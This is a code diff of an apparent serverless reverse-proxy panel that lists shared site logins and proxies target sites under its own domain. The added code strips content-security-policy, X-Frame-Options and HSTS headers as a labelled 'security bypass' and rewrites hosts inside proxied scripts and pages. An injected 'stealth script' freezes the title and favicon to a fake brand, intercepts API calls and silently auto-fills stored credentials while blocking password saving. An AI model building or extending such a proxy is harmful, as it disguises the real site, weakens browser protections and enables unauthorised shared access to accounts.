+                        : `<button onclick="${loginAction}" class="w-full py-4 bg-indigo-600 text-white text-[10px] font-bold uppercase tracking-[0.2em] hover:bg-indigo-500 transition-colors flex items-center justify-center gap-2 mt-4 shadow-[0_0_20px_rgba(99,102,241,0.3)] outline-none"><span>Secure Connect</span><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.75 9V5.25A2.25 2.25 0 0013.5 3h-6a2.25 2.25 0 00-2.25 2.25v13.5A2.25 2.25 0 007.5 21h6a2.25 2.25 0 002.25-2.25V15M12 9l-3 3m0 0l3 3m-3-3h12.75"></path></svg></button>`;
 
                     sitesHTML += `
                     <div class="border border-white/5 bg-[#0a0a0a] p-5 flex flex-col justify-between ${isSuspended ? 'opacity-60 grayscale' : ''}">
@@ -754,7 +379,7 @@ export default {
                                 <span class="text-[8px] font-bold uppercase tracking-widest px-2 py-1 border ${roleColor}">${siteConf.r}</span>
                                 <span class="text-[8px] font-bold uppercase tracking-widest px-2 py-1 border ${statusColor}">${statusText}</span>
                             </div>
-                            <div class="w-8 h-8 bg-white/5 border border-white/10 flex items-center justify-center"><svg class="w-3.5 h-3.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"></path></svg></div>
+                            <div class="w-8 h-8 bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center rounded-sm"><svg class="w-4 h-4 text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"></path></svg></div>
                         </div>
                         
                         <div class="flex-grow">
@@ -765,33 +390,44 @@ export default {
                                 View Panel Details
                             </button>
                             
-                            <div id="details-${siteId}" class="hidden mt-3 space-y-2 p-3 bg-black/40 border border-white/5">
+                            <div id="details-${siteId}" class="hidden mt-3 space-y-2 p-3 bg-black/40 border border-white/5 rounded-sm">
                                 <div class="bg-white/5 border border-white/10 flex items-center p-1.5 w-full">
                                     <span class="text-[8px] font-bold text-gray-500 uppercase px-2 whitespace-nowrap w-[60px]">Username</span>
-                                    <input type="text" readonly value="${siteConf.u}" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none min-w-0 truncate select-all">
+                                    <input type="text" readonly value="${siteConf.u}" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none min-w-0 truncate select-all font-mono">
+                                    <button onclick="copyLink('${siteConf.u}', this)" class="w-7 h-7 flex items-center justify-center bg-indigo-500/10 hover:bg-indigo-500/30 transition-all text-indigo-400 hover:text-white" title="Copy Username">
+                                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
+                                    </button>
                                 </div>
                                 
                                 <div class="bg-white/5 border border-white/10 flex items-center p-1.5 w-full mt-2 relative">
                                     <span class="text-[8px] font-bold text-gray-500 uppercase px-2 whitespace-nowrap w-[60px]">Password</span>
-                                    <input type="text" readonly value="${siteConf.p || ''}" id="pwd-disp-${siteId}" autocomplete="new-password" data-lpignore="true" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none min-w-0 truncate" style="-webkit-text-security: disc; font-family: text-security-disc, sans-serif;">
+                                    <input type="text" readonly value="${siteConf.p || ''}" id="pwd-disp-${siteId}" autocomplete="new-password" data-lpignore="true" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none min-w-0 truncate font-mono" style="-webkit-text-security: disc; font-family: text-security-disc, sans-serif;">
                                     <div class="flex gap-1 flex-shrink-0">
-                                        <button onclick="copyLink(document.getElementById('pwd-disp-${siteId}').value, this)" class="w-7 h-7 flex items-center justify-center bg-white/10 hover:bg-white/20 transition-colors">
-                                            <svg class="w-3.5 h-3.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
+                                        <!-- Eye Toggle Icon -->
+                                        <button onclick="toggleVisibility('pwd-disp-${siteId}', this)" class="w-7 h-7 flex items-center justify-center bg-white/5 hover:bg-white/10 transition-all text-gray-400 hover:text-white" title="Show/Hide Password">
+                                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.522 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
                                         </button>
-                                        <button onclick="toggleEditPwd('${siteId}')" class="h-7 px-3 bg-indigo-500/20 text-indigo-400 hover:bg-indigo-500/40 transition border border-indigo-500/30 text-[8px] font-bold uppercase tracking-widest whitespace-nowrap">Update</button>
+                                        <!-- Copy Icon -->
+                                        <button onclick="copyLink(document.getElementById('pwd-disp-${siteId}').value, this)" class="w-7 h-7 flex items-center justify-center bg-indigo-500/10 hover:bg-indigo-500/30 transition-all text-indigo-400 hover:text-white" title="Copy Password">
+                                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
+                                        </button>
+                                        <!-- Update Icon -->
+                                        <button onclick="toggleEditPwd('${siteId}')" class="w-7 h-7 flex items-center justify-center bg-yellow-500/10 hover:bg-yellow-500/30 transition-all text-yellow-400 hover:text-white" title="Update Password">
+                                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
+                                        </button>
                                     </div>
                                 </div>
                                 <div id="pwd-edit-${siteId}" class="hidden mt-2 flex gap-2 pt-2 border-t border-white/10">
-                                    <input type="text" id="pwd-in-${siteId}" autocomplete="new-password" placeholder="Type new password..." class="flex-grow bg-black/50 border border-white/10 p-2 text-xs text-white outline-none focus:border-indigo-500">
-                                    <button onclick="savePwd('${siteId}')" class="px-4 bg-indigo-600/20 text-indigo-400 border border-indigo-500/50 hover:bg-indigo-600 hover:text-white transition text-[9px] font-bold uppercase tracking-widest">Save</button>
+                                    <input type="text" id="pwd-in-${siteId}" autocomplete="new-password" placeholder="Type new password..." class="flex-grow bg-black/50 border border-white/10 p-2 text-xs text-white outline-none focus:border-yellow-500 transition-colors">
+                                    <button onclick="savePwd('${siteId}')" class="px-4 bg-yellow-500/20 text-yellow-400 border border-yellow-500/50 hover:bg-yellow-500 hover:text-black transition-all text-[9px] font-bold uppercase tracking-widest">Save</button>
                                 </div>
 
                                 <div class="bg-white/5 border border-white/10 flex items-center p-1.5 w-full mt-2">
                                     <span class="text-[8px] font-bold text-gray-500 uppercase px-2 whitespace-nowrap w-[60px]">Link</span>
                                     <input type="text" readonly value="${site.userLink}" class="flex-grow bg-transparent text-[11px] text-blue-400 px-2 outline-none min-w-0 truncate select-all">
                                     <div class="flex-shrink-0">
-                                        <button onclick="copyLink('${site.userLink}', this)" class="w-7 h-7 flex items-center justify-center bg-white/10 hover:bg-white/20 transition-colors">
-                                            <svg class="w-3.5 h-3.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
+                                        <button onclick="copyLink('${site.userLink}', this)" class="w-7 h-7 flex items-center justify-center bg-indigo-500/10 hover:bg-indigo-500/30 transition-all text-indigo-400 hover:text-white" title="Copy Link">
+                                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                                         </button>
                                     </div>
                                 </div>
@@ -808,8 +444,8 @@ export default {
             if (db.settings.whatsapp) {
                 waHTML = `
                 <div class="fixed bottom-6 right-6 z-40 flex items-center justify-center group cursor-pointer" onclick="window.open('https://wa.me/${db.settings.whatsapp.replace(/[^0-9]/g, '')}', '_blank')">
-                    <div class="absolute w-14 h-14 bg-green-500 rounded-full animate-ping opacity-60"></div>
-                    <div class="relative w-14 h-14 bg-green-500 rounded-full flex items-center justify-center shadow-lg group-hover:scale-110 transition duration-300">
+                    <div class="absolute w-14 h-14 bg-green-500 rounded-full animate-ping opacity-40"></div>
+                    <div class="relative w-14 h-14 bg-gradient-to-tr from-green-600 to-green-400 rounded-full flex items-center justify-center shadow-[0_0_20px_rgba(34,197,94,0.5)] group-hover:scale-110 transition duration-300 border-2 border-white/20">
                         <svg class="w-7 h-7 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12.031 0C5.385 0 0 5.385 0 12.031c0 2.12.55 4.195 1.597 6.012L.15 24l6.104-1.602a11.96 11.96 0 005.777 1.488h.005c6.645 0 12.031-5.385 12.031-12.031S18.676 0 12.031 0zm0 21.884c-1.785 0-3.535-.48-5.07-1.386l-.364-.215-3.766.988.996-3.668-.236-.376a9.998 9.998 0 01-1.528-5.342c0-5.523 4.494-10.017 10.017-10.017 5.522 0 10.016 4.494 10.016 10.017 0 5.523-4.494 10.017-10.016 10.017zm5.503-7.518c-.302-.152-1.785-.882-2.062-.982-.277-.101-.48-.152-.682.152-.202.302-.782.982-.958 1.183-.176.202-.353.227-.655.075-1.677-.822-2.825-1.73-3.92-3.623-.177-.303.176-.277.625-1.182.075-.152.038-.278-.038-.429-.075-.152-.682-1.642-.934-2.247-.245-.588-.496-.51-.682-.52h-.58c-.202 0-.53.076-.807.378-.277.303-1.06 1.035-1.06 2.525s1.085 2.928 1.236 3.13c.151.202 2.133 3.257 5.17 4.57 1.956.845 2.76.907 3.754.764.935-.136 2.875-1.176 3.279-2.311.404-1.136.404-2.108.277-2.311-.126-.203-.454-.303-.757-.454z"></path></svg>
                     </div>
                 </div>`;
@@ -854,6 +490,19 @@ export default {
                     <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">${sitesHTML}</div>
                 </div>
                 <script>
+                    function toggleVisibility(id, btn) {
+                        const el = document.getElementById(id);
+                        if(el.style.webkitTextSecurity === 'disc') {
+                            el.style.webkitTextSecurity = 'none';
+                            btn.innerHTML = '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" /></svg>';
+                            btn.classList.remove('text-gray-400'); btn.classList.add('text-green-400');
+                        } else {
+                            el.style.webkitTextSecurity = 'disc';
+                            btn.innerHTML = '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.522 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>';
+                            btn.classList.remove('text-green-400'); btn.classList.add('text-gray-400');
+                        }
+                    }
+
                     function copyLink(text, btn) {
                         if(!text) return;
                         navigator.clipboard.writeText(text);
@@ -961,11 +610,15 @@ export default {
             const proxyRes = await fetch(targetUrl.toString(), fetchConfig);
             const responseHeaders = new Headers();
             
+            // 🚀 SECURITY BYPASS: Remove CSP, X-Frame, & Restrictive headers to fix broken assets
+            const removeHeaders =['content-security-policy', 'content-security-policy-report-only', 'x-frame-options', 'strict-transport-security'];
+            
             for (const [key, value] of proxyRes.headers.entries()) {
-                if (key.toLowerCase() === 'set-cookie') {
+                const kLower = key.toLowerCase();
+                if (kLower === 'set-cookie') {
                     let modCookie = value.replace(/Domain=[^;]+;?\s*/gi, '');
                     responseHeaders.append('Set-Cookie', modCookie);
-                } else {
+                } else if (!removeHeaders.includes(kLower)) {
                     responseHeaders.append(key, value);
                 }
             }
@@ -978,14 +631,22 @@ export default {
             let body = proxyRes.body;
             const contentType = responseHeaders.get("Content-Type") || "";
             
-            if (contentType.includes("text/html")) {
-                let htmlText = await proxyRes.text();
-                htmlText = htmlText.split(targetDomain).join(url.origin);
-                
-                const encTargetTrim = encrypt(targetDomain).substring(0,8);
-                
-                // 🔥 PERFECT STEALTH SCRIPT (Viewport Lock + Frozen Title/Favicon + Strict CSS)
-                const stealthScript = `<script>
+            // 🚀 ADVANCED REWRITE: Fix CSS, JS, HTML missing assets by rewriting deep URLs
+            if (contentType.includes("text/") || contentType.includes("application/json") || contentType.includes("application/javascript")) {
+                try {
+                    let textBody = await proxyRes.text();
+                    let tHost = tDomainObj.host;
+                    let pHost = url.host;
+
+                    // 1. Rewrite full domain structure
+                    textBody = textBody.split(targetDomain).join(url.origin);
+                    // 2. Rewrite base hostname to catch //cdn... or relative mismatches
+                    textBody = textBody.split(tHost).join(pHost);
+                    
+                    if (contentType.includes("text/html")) {
+                        const encTargetTrim = encrypt(targetDomain).substring(0,8);
+                        
+                        const stealthScript = `<script>
 (function(){
     try{
         var p = performance.getEntriesByType("navigation")[0];
@@ -1008,9 +669,6 @@ export default {
             window.history.replaceState(null, '', window.location.pathname + window.location.search + sep + '_ctx=' + ctx);
         }
 
-        // ==========================================
-        // 🔒 FIXED FAVICON & TITLE ENFORCER
-        // ==========================================
         const fixedTitle = "Nexus Digital | Enterprise Solutions";
         const fixedFavicon = "https://i.postimg.cc/zXbrDz13/modern-security-logo-design-safe-your-internet-privacy-1017-51245.jpg";
 
@@ -1032,14 +690,12 @@ export default {
         let headObserver = new MutationObserver(lockIdentity);
         headObserver.observe(document.head, { subtree: true, childList: true, attributes: true, characterData: true });
 
-        // Ensure Viewport Exists
         if(!document.querySelector('meta[name="viewport"]')){
             let v = document.createElement('meta');
             v.name = "viewport"; v.content = "width=device-width, initial-scale=1.0";
             document.head.appendChild(v);
         }
         
-        // API INTERCEPTOR
         var targetHost = new URL("` + targetDomain + `").hostname;
         var apiTarget = "${autoApi}";
         var apiHost = apiTarget ? new URL(apiTarget).hostname : "";
@@ -1125,12 +781,10 @@ export default {
             } catch(e){}
         }
 
-        // ✅ PERFECT AUTO-FILL POPUP & ANTI-CHROME SAVE
         window.addEventListener('DOMContentLoaded', () => {
             const au = "${autoUser}"; const ap = "${autoPwd}";
             if(!au || !ap) return;
 
-            // 1. Extreme Anti Chrome Password Save + Strict Popup CSS Override
             let style = document.createElement('style');
             style.innerHTML = \`
                 .nx-mask { -webkit-text-security: disc !important; font-family: text-security-disc, sans-serif !important; letter-spacing: 2px !important; }
@@ -1168,7 +822,6 @@ export default {
             let domObserver = new MutationObserver(() => secureInputs());
             domObserver.observe(document.body, { childList: true, subtree: true });
 
-            // 2. Responsive UI (With Strict inline styles enforcing size)
             let overlay = document.createElement('div');
             overlay.id = 'nx-popup-overlay';
             
@@ -1231,7 +884,6 @@ export default {
                 hasFilled = true;
             };
 
-            // Trigger Listeners
             const checkTrigger = (e) => {
                 if (hasFilled || rejected) return;
                 if (e.target.tagName === 'INPUT') {
@@ -1240,7 +892,7 @@ export default {
                     if (e.target.classList.contains('nx-mask') || e.target.type === 'password' || n.includes('user') || p.includes('user') || n.includes('login')) {
                         lastFocusedInput = e.target;
                         overlay.style.setProperty('display', 'flex', 'important');
-                        e.target.blur(); // Dismiss mobile keyboard instantly
+                        e.target.blur(); 
                     }
                 }
             };
@@ -1251,14 +903,18 @@ export default {
     }catch(e){}
 })();
 <\/script>`;
-                
-                if (htmlText.includes("<head>")) htmlText = htmlText.replace("<head>", "<head>" + stealthScript); 
-                else htmlText = stealthScript + htmlText;
-                
-                body = htmlText;
-                responseHeaders.delete("Content-Length");
-                responseHeaders.set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
+                        
+                        if (textBody.includes("<head>")) textBody = textBody.replace("<head>", "<head>" + stealthScript); 
+                        else textBody = stealthScript + textBody;
+                    }
+                    
+                    body = textBody;
+                    responseHeaders.delete("Content-Length"); 
+                } catch(err) {
+                    // Fallback to original body stream if parsing fails
+                }
             }
+            
             return new Response(body, { status: proxyRes.status, statusText: proxyRes.statusText, headers: responseHeaders });
         }
 
